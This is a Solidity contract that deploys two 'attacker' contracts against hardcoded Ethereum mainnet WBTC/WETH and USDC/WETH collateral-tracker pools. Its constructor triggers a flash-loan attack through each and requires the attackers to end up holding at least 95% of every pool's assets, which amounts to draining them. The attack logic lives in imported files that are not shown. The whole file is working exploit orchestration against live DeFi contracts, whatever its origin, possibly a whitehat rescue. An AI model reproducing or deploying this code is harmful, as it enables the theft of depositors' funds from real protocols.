// SPDX-License-Identifier: AGPL-3.0
pragma solidity ^0.8.13;

import "./Interfaces.sol";

import {USDC_WETH30bpsMainnetAttacker} from "./Deployable_USDC_WETH30bpsMainnetAttacker.sol";
import {WBTC_WETH30bpsMainnetAttacker} from "./Deployable_WBTC_WETH30bpsMainnetAttacker.sol";

contract WBTC_WETH30bpsMainnet_And_USDC_WETH30bpsMainnetAttacker_Deployer {
    WBTC_WETH30bpsMainnetAttacker public wbtcWethAttacker;
    USDC_WETH30bpsMainnetAttacker public usdcWethAttacker;

    IERC20Partial wbtc = IERC20Partial(address(0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599)); // wbtc
    IERC20Partial weth = IERC20Partial(address(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2)); // weth
    IERC20Partial usdc = IERC20Partial(address(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48)); // usdc

    ICollateralTracker wbtcWethCT0 = ICollateralTracker(address(0xb310cf625f519DA965c587e22Ff6Ecb49809eD09));
    ICollateralTracker wbtcWethCT1 = ICollateralTracker(address(0x1F8D600A0211DD76A8c1Ac6065BC0816aFd118ef));
    ICollateralTracker usdcWethCT0 = ICollateralTracker(address(0xc74dC5908E3E421004f533287c052bF0cc42ddc1));
    ICollateralTracker usdcWethCT1 = ICollateralTracker(address(0x351eFb333885c5351418aE0134dd54cac0B3143F));

    constructor(address _withdrawer) {
        (uint256 wbtcWeth_poolAssets0Before, , ) = wbtcWethCT0.getPoolData();
        (uint256 wbtcWeth_poolAssets1Before, , ) = wbtcWethCT1.getPoolData();
        (uint256 usdcWeth_poolAssets0Before, , ) = usdcWethCT0.getPoolData();
        (uint256 usdcWeth_poolAssets1Before, , ) = usdcWethCT1.getPoolData();

        wbtcWethAttacker = new WBTC_WETH30bpsMainnetAttacker(_withdrawer);
        usdcWethAttacker = new USDC_WETH30bpsMainnetAttacker(_withdrawer);
        wbtcWethAttacker.takeFlashLoanAndAttack();
        usdcWethAttacker.takeFlashLoanAndAttack();

        uint256 wbtcWeth_attackerBalance0 = wbtc.balanceOf(address(wbtcWethAttacker));
        uint256 wbtcWeth_attackerBalance1 = weth.balanceOf(address(wbtcWethAttacker));
        uint256 usdcWeth_attackerBalance0 = usdc.balanceOf(address(usdcWethAttacker));
        uint256 usdcWeth_attackerBalance1 = weth.balanceOf(address(usdcWethAttacker));

        require(wbtcWeth_attackerBalance0 >= (wbtcWeth_poolAssets0Before * 95) / 100);
        require(wbtcWeth_attackerBalance1 >= (wbtcWeth_poolAssets1Before * 95) / 100);
        require(usdcWeth_attackerBalance0 >= (usdcWeth_poolAssets0Before * 95) / 100);
        require(usdcWeth_attackerBalance1 >= (usdcWeth_poolAssets1Before * 95) / 100);
    }
}
